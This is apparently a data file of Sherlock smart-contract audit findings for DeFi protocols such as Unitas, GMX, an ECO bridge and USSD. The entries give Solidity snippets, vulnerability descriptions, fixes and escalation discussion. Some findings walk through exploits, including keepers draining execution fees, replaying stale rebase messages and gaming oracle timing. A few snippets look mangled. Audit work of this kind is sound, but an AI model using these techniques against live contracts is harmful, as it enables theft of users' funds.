value is 13000 USD Liabilities (USDEMC) value is 10000 USD Reserve Ratio is (10000 + 3000) / 10000 = 130%.\nLater on, USDEMC appreciates upto 10% and we can get:\nAllReserves value is still 13000 USD Liabilities (USDEMC) value is 11000 USD Reserve Ratio is (10000 + 3000) / 11000 = 118%.\nThe available balance in Unitas is 8000 USD so there is 3000 USD in short, it needs to be obtain from InsurancePool, however, the available balance in InsurancePool is 2400 USD, transaction will be reverted and users cannot redeem.\nThere would also be an extreme situation when reserve ratio is above 100% but there is no available `balance` in protocol because all the `balance` is `portfolio` (this is possible when InsurancePool is drained out), users cannot redeem any USDT in this case.ч"Portfolio should not be taken into account for the calculation of reserve ratio.\n```\n    function _getTotalReservesAndCollaterals() internal view returns (uint256 reserves, uint256 collaterals) {\n        // rest of code\n// Remove the line below\n           uint256 tokenReserve = _getBalance(token);\n// Add the line below\n           uint256 tokenReserve = _getBalance(token) // Remove the line below\n _getPortfolio(token);\n// Remove the line below\n           uint256 tokenCollateral = IInsurancePool(insurancePool).getCollateral(token);\n// Add the line below\n           uint256 tokenCollateral = IInsurancePool(insurancePool).getCollateral(token) // Remove the line below\n IInsurancePool(insurancePool).getPortfolio(token);\n        // rest of code\n    }\n```\n\nDiscussion\nSunXrex\nWe think it's invalid. it's design decision.\nAditya: The purpose of insurance pool is to support additional USDT requirements in the scenario the reserve pool does not have required amount. To simplify this, we keep only a small portion of assets for yield generation. Priorities : User redemption above yield generation. Ie: Only when there is enough capital in reserve and insurance pool, we take a small portion to invest in delta nuetral defi pools.\nctf-sec\nProtocol's design choice, not a issue\n0xruhum\nEscalate for 10 USDC This is not just a design choice. There are no specifics on what a ""small portion"" or ""enough capital in reserve and insurance pool"" means. Allowing the protocol team to remove collateral from the system to earn yield is a security risk. In the current version, USDT is the collateral for USD1. Without USDT, USD1 is worth nothing. The reserve ratio is used to keep the protocol healthy at all times. By including the funds inside the portfolio in the calculation you allow the protocol to become under-collateralized under certain circumstances.\nConsidering that #16 describes the risk of the portfolio incurring a loss which is deemed a valid issue, it's reckless to account for the funds inside the portfolio when calculating the reserve ratio. From a protocol perspective, these funds are not part of the system anymore. They were moved into a different protocol to earn yield. That is fine as long as you keep the reserve ratio of Unitas above 130%. For that to be the case, the funds inside the portfolio have to be excluded from the reserve ratio calculation.\nTo sum up, any funds inside the portfolio should not be used to calculate the reserve ratio. They can be gone at any moment due to the risks described in #16.\nEDIT:\n#14 is not a valid duplicate. If portfolio > collateral the subtraction would revert so there's no underflow there.\n#43 is not a valid duplicate. Warden argues that `_getPortfolio()` is not called although it clearly is in the code snipped they provide. The submission makes no sense\n#90 is not a valid duplicate. Warden argues that a swap will fail if there are not enough funds in the insurance pool. That's desired behavior. You don't want to execute the swap if there are not enough funds for it.\n#127 is not a valid duplicate. Warden argues that the portfolio amount is accounted for multiple times. But, the insurance pool is a separate contract. The portfolio amount would be 0 for the insurance pool. Thus you don't account for it twice.\n#129 is not a valid duplicate. The issue itself is valid. The admin is able to leave the protocol under-collateralized by sending to many funds to the portfolio. That's a duplicate of #40\n#142 is not a valid duplicate. Tokens that are not registered in the TokenManager are not used as collateral. Even if the insurance pool holds these tokens they shouldn't be accounted for since they are not registered collateral tokens. Also, the admin has to make a mistake and send these tokens to the insurance pool since they are the only ones that are allowed to deposit.\nI checked the docs on whether each of these duplication issues had to be escalated separately. I didn't find any rules for that. So I decided to bring them up in a single comment. Otherwise, I'd had to create 6 additional escalations without even knowing whether this original issue here is deemed valid. If that's not the case you don't care about the wrong duplication anyways.\nsherlock-admin\nEscalate for 10 USDC This is not just a design choice. There are no specifics on what a ""small portion"" or ""enough capital in reserve and insurance pool"" means. Allowing the protocol team to remove collateral from the system to earn yield is a security risk. In the current version, USDT is the collateral for USD1. Without USDT, USD1 is worth nothing. The reserve ratio is used to keep the protocol healthy at all times. By including the funds inside the portfolio in the calculation you allow the protocol to become under-collateralized under certain circumstances.\nConsidering that #16 describes the risk of the portfolio incurring a loss which is deemed a valid issue, it's reckless to account for the funds inside the portfolio when calculating the reserve ratio. From a protocol perspective, these funds are not part of the system anymore. They were moved into a different protocol to earn yield. That is fine as long as you keep the reserve ratio of Unitas above 130%. For that to be the case, the funds inside the portfolio have to be excluded from the reserve ratio calculation.\nTo sum up, any funds inside the portfolio should not be used to calculate the reserve ratio. They can be gone at any moment due to the risks described in #16.\nEDIT:\n#14 is not a valid duplicate. If portfolio > collateral the subtraction would revert so there's no underflow there.\n#43 is not a valid duplicate. Warden argues that `_getPortfolio()` is not called although it clearly is in the code snipped they provide. The submission makes no sense\n#90 is not a valid duplicate. Warden argues that a swap will fail if there are not enough funds in the insurance pool. That's desired behavior. You don't want to execute the swap if there are not enough funds for it.\n#127 is not a valid duplicate. Warden argues that the portfolio amount is accounted for multiple times. But, the insurance pool is a separate contract. The portfolio amount would be 0 for the insurance pool. Thus you don't account for it twice.\n#129 is not a valid duplicate. The issue itself is valid. The admin is able to leave the protocol under-collateralized by sending to many funds to the portfolio. That's a duplicate of #40\n#142 is not a valid duplicate. Tokens that are not registered in the TokenManager are not used as collateral. Even if the insurance pool holds these tokens they shouldn't be accounted for since they are not registered collateral tokens. Also, the admin has to make a mistake and send these tokens to the insurance pool since they are the only ones that are allowed to deposit.\nI checked the docs on whether each of these duplication issues had to be escalated separately. I didn't find any rules for that. So I decided to bring them up in a single comment. Otherwise, I'd had to create 6 additional escalations without even knowing whether this original issue here is deemed valid. If that's not the case you don't care about the wrong duplication anyways.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nctf-sec\nWill bring for sponsor review, I think this can be a valid medium\nthangtranth\nEscalate for 10 USDC\nReading the original report, I see no mentioning of the potential path or risk that leads to the issue. However in the escalation, the arguments are built upon the insights and finding of another report after submission. If the original report stands alone, I am not sure that it is convincing enough.\nThis escalation also aims to clarify the rules for other Watsons who may do the same in the future.\nsherlock-admin\nEscalate for 10 USDC\nReading the original report, I see no mentioning of the potential path or risk that leads to the issue. However in the escalation, the arguments are built upon the insights and finding of another report after submission. If the original report stands alone, I am not sure that it is convincing enough.\nThis escalation also aims to clarify the rules for other Watsons who may do the same in the future.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\njacksanford1\n@0xruhum I see what you're getting at. But the only way this can be a valid issue is if the protocol has intended for users to always be able to redeem USD1 into USDT when the reserve ratio is 100% or greater. I don't think Unitas has made that claim anywhere? If you see a claim like this (in comments or in code), please show me.\njacksanford1\nUpdate @0xruhum: Based on the following sentence in the README, the broader point of this issue should be true:\nThe Unitas protocol guarantees unrestricted and unconditional conversion of its unitized stablecoins “back” to USD-pegged stablecoins.\nThe issue correct gets that ""users may not be able to fully redeem USD1 into USDT even when the reserve ratio is above 100%"" so this issue should be a valid Medium (maybe even High). But the portfolio aspect is not super unique, so it should be duplicated with any other issues that get the general idea of this vulnerability.\njacksanford1\nEscalation accepted\nDuplicate of #13\n0xruhum\nBut the portfolio aspect is not super unique, so it should be duplicated with any other issues that get the general idea of this vulnerability.\nYep. Just wanted to mention again that the issues I've linked in the original escalation comment aren't valid duplicates tho. That should be taken into account.\njacksanford1\nOk @0xruhum, as far as I'm aware none of them are considered to be duplicates right now.\nJiamincoin\nOk @0xruhum, as far as I'm aware none of them are considered to be duplicates right now.\nHey I think #114 should be taken into account too. I didn't create escalation because it was considered duplicate of the main report in the first place.\njacksanford1\nOk @Jiamincoin, I agree that #114 is a duplicate of this issue.\n0x00ffDa\nI do not see any discussion of duplicate #118. Please consider it before ending the escalation evaluations.\nhrishibhat\nResult: Medium Has duplicates\nsherlock-admin\nEscalations have been resolved successfully!\nEscalation status:\n0xruhum: accepted\nthangtranth: rejected\njacksanford1\nAcknowledged by protocol team (won't fix)."чUsers may not be able to fully redeem USD1 into USDT even when reserve ratio is above 100%, this defeats the purpose of reserve ratio and breaks the promise of the protocol, users may be mislead and lose funds.\nCode Snippet\nTool used\nManual Review
PriceOracle will use the wrong price if the Chainlink registry returns price outside min/max rangeчmediumч"```\nfunction getPriceFromChainlink(address base, address quote) internal view returns (uint256) {\n    (, int256 price,,,) = registry.latestRoundData(base, quote);\n    require(price > 0, ""invalid price"");\n\n    // Extend the decimals to 1e18.\n    return uint256(price) * 10 ** (18 - uint256(registry.decimals(base, quote)));\n}\n```\n"ч"Chainlink aggregators have a built in circuit breaker if the price of an asset goes outside of a predetermined price band. The result is that if an asset experiences a huge drop in value (i.e. LUNA crash) the price of the oracle will continue to return the minPrice instead of the actual price of the asset. This would allow user to continue borrowing with the asset but at the wrong price. This is exactly what happened to Venus on BSC when LUNA imploded.\nNote there is only a check for `price` to be non-negative, and not within an acceptable range.\n```\nfunction getPriceFromChainlink(address base, address quote) internal view returns (uint256) {\n    (, int256 price,,,) = registry.latestRoundData(base, quote);\n    require(price > 0, ""invalid price"");\n\n    // Extend the decimals to 1e18.\n    return uint256(price) * 10 ** (18 - uint256(registry.decimals(base, quote)));\n}\n```\n\nA similar issue is seen here."ч"
getPriceFromChainlink() doesn't check If Arbitrum sequencer is down in Chainlink feedsчmediumч"```\n    function getPriceFromChainlink(address base, address quote) internal view returns (uint256) {\n      (, int256 price,,,) = registry.latestRoundData(base, quote);\n        require(price > 0, ""invalid price"");\n\n        // Extend the decimals to 1e18.\n        return uint256(price) * 10 ** (18 - uint256(registry.decimals(base, quote)));\n    }\n```\n"ч"When utilizing Chainlink in L2 chains like Arbitrum, it's important to ensure that the prices provided are not falsely perceived as fresh, even when the sequencer is down. This vulnerability could potentially be exploited by malicious actors to gain an unfair advantage.\nThere is no check: getPriceFromChainlink\n```\n    function getPriceFromChainlink(address base, address quote) internal view returns (uint256) {\n      (, int256 price,,,) = registry.latestRoundData(base, quote);\n        require(price > 0, ""invalid price"");\n\n        // Extend the decimals to 1e18.\n        return uint256(price) * 10 ** (18 - uint256(registry.decimals(base, quote)));\n    }\n```\n"ч
Limit swap orders can be used to get a free look into the futureчhighч```\n    1 2 3 4 5 6 7 8 9 < block number\nO1: A B B B B C C C D\nA A B B B B C C C\n^^ grouped oracle block ranges\n```\nчUsers can cancel their limit swap orders to get a free look into prices in future blocks\nThis is a part of the same issue that was described in the last contest. The sponsor fixed the bug for `LimitDecrease` and `StopLossDecrease`, but not for `LimitSwap`.\nAny swap limit order submitted in block range N can't be executed until block range N+2, because the block range is forced to be after the submitted block range, and keepers can't execute until the price has been archived, which necessarily won't be until after block range N+1. Consider what happens when half of the oracle's block ranges are off from the other half, e.g.:\n```\n    1 2 3 4 5 6 7 8 9 < block number\nO1: A B B B B C C C D\nA A B B B B C C C\n^^ grouped oracle block ranges\n```\n\nAt block 1, oracles in both groups (O1 and O2) are in the same block range A, and someone submits a large swap limit order (N). At block 6, oracles in O1 are in N+2, but oracles in O2 are still in N+1. This means that the swap limit order will execute at the median price of block 5 (since the earliest group to have archive prices at block 6 for N+1 will be O1) and market swap order submitted at block 6 in the other direction will execute at the median price of block 6 since O2 will be the first group to archive a price range that will contain block 6. By the end of block 5, the price for O1 is known, and the price that O2 will get at block 6 can be predicted with high probability (e.g. if the price has just gapped a few cents), so a trader will know whether the two orders will create a profit or not. If a profit is expected, they'll submit the market order at block 6. If a loss is expected, they'll cancel the swap limit order from block 1, and only have to cover gas fees.\nEssentially the logic is that limit swap orders will use earlier prices, and market orders (with swaps) will use later prices, and since oracle block ranges aren't fixed, an attacker is able to know both prices before having their orders executed, and use large order sizes to capitalize on small price differences.ч
User can loose funds in case if swapping in DecreaseOrderUtils.processOrder will failчmediumч```\n        try params.contracts.swapHandler.swap(\n            SwapUtils.SwapParams(\n                params.contracts.dataStore,\n                params.contracts.eventEmitter,\n                params.contracts.oracle,\n                Bank(payable(order.market())),\n                params.key,\n                result.outputToken,\n                result.outputAmount,\n                params.swapPathMarkets,\n                0,\n                order.receiver(),\n                order.uiFeeReceiver(),\n                order.shouldUnwrapNativeToken()\n            )\n        ) returns (address tokenOut, uint256 swapOutputAmount) {\n            `(\n                params.contracts.oracle,\n                tokenOut,\n                swapOutputAmount,\n                order.minOutputAmount()\n            );\n        } catch (bytes memory reasonBytes) {\n            (string memory reason, /* bool hasRevertMessage */) = ErrorUtils.getRevertMessage(reasonBytes);\n\n            _handleSwapError(\n                params.contracts.oracle,\n                order,\n                result,\n                reason,\n                reasonBytes\n            );\n        }\n    }\n```\nчWhen user executes decrease order, then he provides `order.minOutputAmount` value, that should protect his from loses. This value is provided with hope that swapping that will take some fees will be executed. But in case if swapping will fail, then this `order.minOutputAmount` value will be smaller then user would like to receive in case when swapping didn't occur. Because of that user can receive less output amount.\n`DecreaseOrderUtils.processOrder` function executed decrease order and returns order execution result which contains information about output tokens and amounts that user should receive.\n```\n        try params.contracts.swapHandler.swap(\n            SwapUtils.SwapParams(\n                params.contracts.dataStore,\n                params.contracts.eventEmitter,\n                params.contracts.oracle,\n                Bank(payable(order.market())),\n                params.key,\n                result.outputToken,\n                result.outputAmount,\n                params.swapPathMarkets,\n                0,\n                order.receiver(),\n                order.uiFeeReceiver(),\n                order.shouldUnwrapNativeToken()\n            )\n        ) returns (address tokenOut, uint256 swapOutputAmount) {\n            `(\n                params.contracts.oracle,\n                tokenOut,\n                swapOutputAmount,\n                order.minOutputAmount()\n            );\n        } catch (bytes memory reasonBytes) {\n            (string memory reason, /* bool hasRevertMessage */) = ErrorUtils.getRevertMessage(reasonBytes);\n\n            _handleSwapError(\n                params.contracts.oracle,\n                order,\n                result,\n                reason,\n                reasonBytes\n            );\n        }\n    }\n```\n\n```\n    null(\n        Oracle oracle,\n        Order.Props memory order,\n        DecreasePositionUtils.DecreasePositionResult memory result,\n        string memory reason,\n        bytes memory reasonBytes\n    ) internal {\n        emit SwapUtils.SwapReverted(reason, reasonBytes);\n\n        _validateOutputAmount(\n            oracle,\n            result.outputToken,\n            result.outputAmount,\n            order.minOutputAmount()\n        );\n\n        MarketToken(payable(order.market())).transferOut(\n            result.outputToken,\n            order.receiver(),\n            result.outputAmount,\n            order.shouldUnwrapNativeToken()\n        );\n    }\n```\n\nAs you can see in this case `_validateOutputAmount` function will be called as well, but it will be called with `result.outputAmount` this time, which is amount provided by decreasing of position.\nNow i will describe the problem. In case if user wants to swap his token, he knows that he needs to pay fees to the market pools and that this swap will eat some amount of output. So in case if `result.outputAmount` is 100$ worth of tokenA, it's fine if user will provide slippage as 3% if he has long swap path, so his slippage is 97$. But in case when swap will fail, then now this slippage of 97$ is incorrect as user didn't do swapping and he should receiev exactly 100$ worth of tokenA.\nAlso i should note here, that it's easy to make swap fail for keeper, it's enough for him to just not provide any asset price, so swap reverts. So keeper can benefit on this slippage issue.ч
short side of getReservedUsd does not work for market that has the same collateral tokenчmediumч```\n    function getReservedUsd(\n        DataStore dataStore,\n        Market.Props memory market,\n        MarketPrices memory prices,\n        bool isLong\n    ) internal view returns (uint256) {\n        uint256 reservedUsd;\n        if (isLong) {\n            // for longs calculate the reserved USD based on the open interest and current indexTokenPrice\n            // this works well for e.g. an ETH / USD market with long collateral token as WETH\n            // the available amount to be reserved would scale with the price of ETH\n            // this also works for e.g. a SOL / USD market with long collateral token as WETH\n            // if the price of SOL increases more than the price of ETH, additional amounts would be\n            // automatically reserved\n            uint256 openInterestInTokens = getOpenInterestInTokens(dataStore, market, isLong);\n            reservedUsd = openInterestInTokens * prices.indexTokenPrice.max;\n        } else {\n            // for shorts use the open interest as the reserved USD value\n            // this works well for e.g. an ETH / USD market with short collateral token as USDC\n            // the available amount to be reserved would not change with the price of ETH\n            reservedUsd = getOpenInterest(dataStore, market, isLong);\n        }\n\n        return reservedUsd;\n    }\n```\nчshort side of getReservedUsd does not work for market that has the same collateral token\nConsider the case of ETH / USD market with both long and short collateral token as ETH.\nthe available amount to be reserved (ETH) would CHANGE with the price of ETH.\n```\n    function getReservedUsd(\n        DataStore dataStore,\n        Market.Props memory market,\n        MarketPrices memory prices,\n        bool isLong\n    ) internal view returns (uint256) {\n        uint256 reservedUsd;\n        if (isLong) {\n            // for longs calculate the reserved USD based on the open interest and current indexTokenPrice\n            // this works well for e.g. an ETH / USD market with long collateral token as WETH\n            // the available amount to be reserved would scale with the price of ETH\n            // this also works for e.g. a SOL / USD market with long collateral token as WETH\n            // if the price of SOL increases more than the price of ETH, additional amounts would be\n            // automatically reserved\n            uint256 openInterestInTokens = getOpenInterestInTokens(dataStore, market, isLong);\n            reservedUsd = openInterestInTokens * prices.indexTokenPrice.max;\n        } else {\n            // for shorts use the open interest as the reserved USD value\n            // this works well for e.g. an ETH / USD market with short collateral token as USDC\n            // the available amount to be reserved would not change with the price of ETH\n            reservedUsd = getOpenInterest(dataStore, market, isLong);\n        }\n\n        return reservedUsd;\n    }\n```\nчConsider apply both long and short calculations of reserveUsd with relation to the indexTokenPrice.\nDiscussion\nIllIllI000\nleaning towards invalid, but will let sponsor verify\nxvi10\nit would not be advisable to use non-stablecoins to back short positions\nin case a non-stablecoin is used to back short positions, the amount to be reserved may not need to be changed since the reserve ratio should still validate if the total open interest is a reasonable ratio of the pool's USD value\nIllIllI000\n@xvi10 inadvisable, and the stipulation that open interest be a 'reasonable ratio' seem to indication that this bug is possible, and should therefore remain open - am I misunderstanding what you've said\nxvi10\nthe issue does not seem valid to me and the current contract code seems reasonable, an example:\nthere is $50m worth of ETH in the pool and the reserve factor is set to 0.25\na max of $12.5m shorts can be opened\nwhen validating the reserve we check that the max short open interest does not exceed this\nif the price of ETH decreases and is now worth $40m, the validation would be that the max open interest does not exceed $10m\nthe pending pnl of the short positions would increase if the price of ETH decreases, which is a problem with choosing to use a non-stablecoin to back short positions rather than an issue with the validation\nin that case the cap of trader pnl and ADL could help to reduce the risk of the market becoming insolvent, but it would be better to avoid the situation by not using a non-stablecoin to back short positions\nIllIllI000\nwhich is a problem with choosing to use a non-stablecoin to back short positions rather than an issue with the validation\nI can see that argument, but you seem to be indicating that users are allowed to do it anyway, and markets becoming insolvent seems like a situation that should be prevented. I'll let Sherlock decide\nxvi10\nmarkets have a risk of becoming insolvent, capping trader pnl and ADL helps, reducing the risk of insolvency is left up to the market creator to configure the backing tokens and parameters\nhrishibhat\nConsidering this issue as a valid medium based on the above comments that there is a possibility of market insolvencyчreservedUsd does not work when long and short collateral tokens are the same.\nCode Snippet\nTool used\nManual Review
Keepers can steal additional execution fee from usersчmediumч```\nEXECUTION_GAS_FEE_BASE_AMOUNT = 0\nEXECUTION_GAS_FEE_MULTIPLIER_FACTOR = 1\nexecutionFeeUserHasPaid = 200K Gwei\ntx.gasprice = 1 Gwei\nactualUsedGas = 100K\n```\nчThe implementation of `payExecutionFee()` didn't take EIP-150 into consideration, a malicious keeper can exploit it to drain out all execution fee users have paid, regardless of the actual execution cost.\nThe issue arises on `L55` of `payExecutionFee()`, as it's an `external` function, callingpayExecutionFee() is subject to EIP-150. Only `63/64` gas is passed to the `GasUtils` sub-contract(external library), and the remaing `1/64` gas is reserved in the caller contract which will be refunded to keeper(msg.sender) after the execution of the whole transaction. But calculation of `gasUsed` includes this portion of the cost as well.\nA malicious keeper can exploit this issue to drain out all execution fee, regardless of the actual execution cost. Let's take `executeDeposit()` operation as an example to show how it works:\nTo simplify the problem, given\n```\nEXECUTION_GAS_FEE_BASE_AMOUNT = 0\nEXECUTION_GAS_FEE_MULTIPLIER_FACTOR = 1\nexecutionFeeUserHasPaid = 200K Gwei\ntx.gasprice = 1 Gwei\nactualUsedGas = 100K\n```\n\nLet's say, the keeper sets `tx.gaslimit` to make\n```\nstartingGas = 164K\n```\n\n```\nuint256 gasUsed = startingGas - gasleft() = 164K - (164K - 100K) * 63 / 64 = 101K\n```\n\nand\n```\nexecutionFeeForKeeper = 101K * tx.gasprice = 101K * 1 Gwei = 101K Gwei\nrefundFeeForUser = 200K - 101K = 99K Gwei\n```\n\nAs setting of `tx.gaslimit` doesn't affect the actual gas cost of the whole transaction, the excess gas will be refunded to `msg.sender`. Now, the keeper increases `tx.gaslimit` to make `startingGas = 6500K`, the calculation of `gasUsed` would be\n```\nuint256 gasUsed = startingGas - gasleft() = 6500K - (6500K - 100K) * 63 / 64 = 200K\n```\n\nand\n```\nexecutionFeeForKeeper = 200K * tx.gasprice = 200K * 1 Gwei = 200K Gwei\nrefundFeeForUser = 200K - 200K = 0 Gwei\n```\n\nWe can see the keeper successfully drain out all execution fee, the user gets nothing refunded.чThe description in `Vulnerability Detail` section has been simplified. In fact, `gasleft` value should be adjusted after each external call during the whole call stack, not just in `payExecutionFee()`.чKeepers can steal additional execution fee from users.\nCode Snippet\nTool used\nManual Review
An Oracle Signer can never be removed even if he becomes maliciousчmediumч"```\n function removeOracleSignerAfterSignal(address account) external onlyTimelockAdmin nonReentrant {\n        bytes32 actionKey = _addOracleSignerActionKey(account);\n        _validateAndClearAction(actionKey, ""removeOracleSigner"");\n\n        oracleStore.removeSigner(account);\n\n        EventUtils.EventLogData memory eventData;\n        eventData.addressItems.initItems(1);\n        eventData.addressItems.setItem(0, ""account"", account);\n        eventEmitter.emitEventLog1(\n            ""RemoveOracleSigner"",\n            actionKey,\n            eventData\n        );\n    }\n```\n"ч"The call flow of removeOracleSIgner incorrectly compares the hash of (""removeOracleSigner"", account) with the hash of (""addOracleSigner"", account) for validating that an action is actually initiated. This validation always fails because the hashes can never match.\nThe process of removing oracle signers is 2 stage. First function `signalRemoveOracleSigner` is called by the TimelockAdmin which stores a time-delayed timestamp corresponding to the keccak256 hash of (""removeOracleSigner"", account) - a bytes32 value called actionKey in the pendingActions mapping.\nThen the Admin needs to call function `removeOracleSignerAfterSignal` but this function calls `_addOracleSignerActionKey` instead of `_removeOracleSignerActionKey` for calculating the bytes32 action key value. Now the actionKey is calculated as keccak256 hash of (""addOracleSigner"", account) and this hash is used for checking if this action is actually pending by ensuring its timestamp is not zero inside the `_validateAction` function called via `_validateAndClearAction` function at Line 122. The hash of (""removeOracleSigner"", account) can never match hash of (""addOracleSigner"", account) and thus this validation will fail.\n```\n function removeOracleSignerAfterSignal(address account) external onlyTimelockAdmin nonReentrant {\n        bytes32 actionKey = _addOracleSignerActionKey(account);\n        _validateAndClearAction(actionKey, ""removeOracleSigner"");\n\n        oracleStore.removeSigner(account);\n\n        EventUtils.EventLogData memory eventData;\n        eventData.addressItems.initItems(1);\n        eventData.addressItems.setItem(0, ""account"", account);\n        eventEmitter.emitEventLog1(\n            ""RemoveOracleSigner"",\n            actionKey,\n            eventData\n        );\n    }\n```\n"чReplace the call to _addOracleSignerActionKey at Line 118 by call to _removeOracleSignerActionKeyчThe process of removing an Oracle Signer will always revert and this breaks an important safety measure if a certain oracle signer becomes malicious the TimelockAdmin could do nothing(these functions are meant for this). Hence, important functionality is permanently broken.\nCode Snippet\nTool used\nManual Review
Stale inflationMultiplier in L1ECOBridgeчhighч```\n    function rebase(uint32 _l2Gas) external {\n        inflationMultiplier = IECO(l1Eco).getPastLinearInflation(block.number);\n```\nч`L1ECOBridge::inflationMultiplier` is updated through `L1ECOBridge::rebase` on Ethereum, and it is used in `_initiateERC20Deposit` and `finalizeERC20Withdrawal` to convert between token amount and `_gonsAmount`. However, if `rebase` is not called in a timely manner, the `inflationMultiplier` value can be stale and inconsistent with the value of L1 ECO token during transfer, leading to incorrect token amounts in deposit and withdraw.\nThe `inflationMultiplier` value is updated in `rebase` with an independent transaction on L1 as shown below:\n```\n    function rebase(uint32 _l2Gas) external {\n        inflationMultiplier = IECO(l1Eco).getPastLinearInflation(block.number);\n```\n\nHowever, in both `_initiateERC20Deposit`, `transferFrom` is called before the `inflationMultiplier` is used, which can lead to inconsistent results if `rebase` is not called on time for the `inflationMultiplier` to be updated. The code snippet for `_initiateERC20Deposit` is as follows:\n```\n        IECO(_l1Token).transferFrom(_from, address(this), _amount);\n        _amount = _amount * inflationMultiplier;\n```\n\n`finalizeERC20Withdrawal` has the same problem.\n```\n        uint256 _amount = _gonsAmount / inflationMultiplier;\n        bytes memory _ecoTransferMessage = abi.encodeWithSelector(IERC20.transfer.selector,_to,_amount);\n```\n\nThe same problem does not exist in L2ECOBridge. Because the L2 rebase function updates inflationMultiplier and rebase l2Eco token synchronously.\n```\n    function rebase(uint256 _inflationMultiplier)\n        external\n        virtual\n        onlyFromCrossDomainAccount(l1TokenBridge)\n        validRebaseMultiplier(_inflationMultiplier)\n    {\n        inflationMultiplier = _inflationMultiplier;\n        l2Eco.rebase(_inflationMultiplier);\n        emit RebaseInitiated(_inflationMultiplier);\n    }\n```\nч
Malicious actor cause rebase to an old inflation multiplierчhighч```\n    function rebase(uint32 _l2Gas) external {\n        inflationMultiplier = IECO(l1Eco).getPastLinearInflation(\n            block.number\n        );\n\n        bytes memory message = abi.encodeWithSelector(\n            IL2ECOBridge.rebase.selector,\n            inflationMultiplier\n        );\n\n        sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n    }\n```\nчThe protocol has a rebasing mechanism that allows to sync the inflation multiplier between both L1 and L2 chains. The call to rebase is permissionless (anyone can trigger it). Insufficant checks allow a malicious actor to rebase to an old value.\n```\n    function rebase(uint32 _l2Gas) external {\n        inflationMultiplier = IECO(l1Eco).getPastLinearInflation(\n            block.number\n        );\n\n        bytes memory message = abi.encodeWithSelector(\n            IL2ECOBridge.rebase.selector,\n            inflationMultiplier\n        );\n\n        sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n    }\n```\n\nA malicious actor can call this function a large amount of times to queue messages on `L2CrossDomainMessenger`. Since it is expensive to execute so much messages from `L2CrossDomainMessenger` (especially if the malicious actor sets `_l2Gas` to a high value) there will be a rebase message that will not be relayed through `L2CrossDomainMessenger` (or in failedMessages array).\nSome time passes and other legitimate rebase transactions get executed.\nOne day the malicious actor can execute one of his old rebase messages and set the value to the old value. The attacker will debalance the scales between L1 and L2 and can profit from it.чWhen sending a rebase from L1, include in the message the L1 block number. In L2 rebase, validate that the new rebase block number is above previous block number\nDiscussion\nalbertnbrown\nThis is legitimate because unlike upgrade functions, the `rebase` function has no auth guards. We have added fixes to this to this PR:\nhttps://github.com/eco-association/op-eco/pull/33\n0xdeadbeef0x\nEscalate for 10 USDC\nEscalating to verify that this gets the the reward tag as it was confirmed and fixed by the sponsor.\nsherlock-admin\nEscalate for 10 USDC\nEscalating to verify that this gets the the reward tag as it was confirmed and fixed by the sponsor.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\nEscalation accepted\nValid high\nsherlock-admin\nEscalation accepted\nValid high\n```\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.\n```\n\n0xffff11\nAdded fix in: https://github.com/eco-association/op-eco/pull/33\n0xffff11\nFix confirmed, added block number to L1 calls to prevent any replay attacks using failed cross-bridge callsчdebalance the scales between L1 and L2 ECO token\nCode Snippet\nTool used\nManual Review
`StableOracleDAI` calculates `getPriceUSD` with inverted base/rate tokens for Chainlink priceчhighч```\n/// constructor\n   priceFeedDAIETH = AggregatorV3Interface(\n       0x773616E4d11A78F511299002da57A0a94577F1f4\n   );\n\n/// getPrice()\n   // chainlink price data is 8 decimals for WETH/USD, so multiply by 10 decimals to get 18 decimal fractional\n   //(uint80 roundID, int256 price, uint256 startedAt, uint256 timeStamp, uint80 answeredInRound) = priceFeedDAIETH.latestRoundData();\n   (, int256 price, , , ) = priceFeedDAIETH.latestRoundData();\n```\nч`StableOracleDAI::getPriceUSD()` calculates the average price between the Uniswap pool price for a pair and the Chainlink feed as part of its result.\nThe problem is that it uses `WETH/DAI` as the base/rate tokens for the pool, and `DAI/ETH` for the Chainlink feed, which is the opposite.\nThis will incur in a huge price difference that will impact on the amount of USSD tokens being minted, while requesting the price from this oracle.\nIn `StableOracleDAI::getPrice()` the `price` from the Chainlink feed `priceFeedDAIETH` returns the `price` as DAI/ETH.\nThis can be checked on Etherscan and the Chainlink Feeds Page.\nAlso note the comment on the code is misleading, as it is refering to another pair:\nchainlink price data is 8 decimals for WETH/USD\n```\n/// constructor\n   priceFeedDAIETH = AggregatorV3Interface(\n       0x773616E4d11A78F511299002da57A0a94577F1f4\n   );\n\n/// getPrice()\n   // chainlink price data is 8 decimals for WETH/USD, so multiply by 10 decimals to get 18 decimal fractional\n   //(uint80 roundID, int256 price, uint256 startedAt, uint256 timeStamp, uint80 answeredInRound) = priceFeedDAIETH.latestRoundData();\n   (, int256 price, , , ) = priceFeedDAIETH.latestRoundData();\n```\n\nLink to code\nOn the other hand, the price coming from the Uniswap pool `DAIWethPrice` returns the price as `WETH/DAI`.\nNote that the relation WETH/DAI is given by the orders of the token addresses passed as arguments, being the first the base token, and the second the quote token.\nAlso note that the variable name `DAIWethPrice` is misleading as well as the base/rate are the opposite (although this doesn't affect the code).\n```\n    uint256 DAIWethPrice = DAIEthOracle.quoteSpecificPoolsWithTimePeriod(\n        1000000000000000000, // 1 Eth\n        0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH (base token) // @audit\n        0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI (quote token) // @audit\n        pools, // DAI/WETH pool uni v3\n        600 // period\n    );\n```\n\nLink to code\nFinally, both values are used to calculate an average price of in `((DAIWethPrice + uint256(price) * 1e10) / 2)`.\nBut as seen, one has price in `DAI/ETH` and the other one in `WETH/DAI`, which leads to an incorrect result.\n```\n    return\n        (wethPriceUSD * 1e18) /\n        ((DAIWethPrice + uint256(price) * 1e10) / 2);\n```\n\nLink to code\nThe average will be lower in this case, and the resulting price higher.\nThis will be used by `USSD::mintForToken()` for calculating the amount of tokens to mint for the user, and thus giving them much more than they 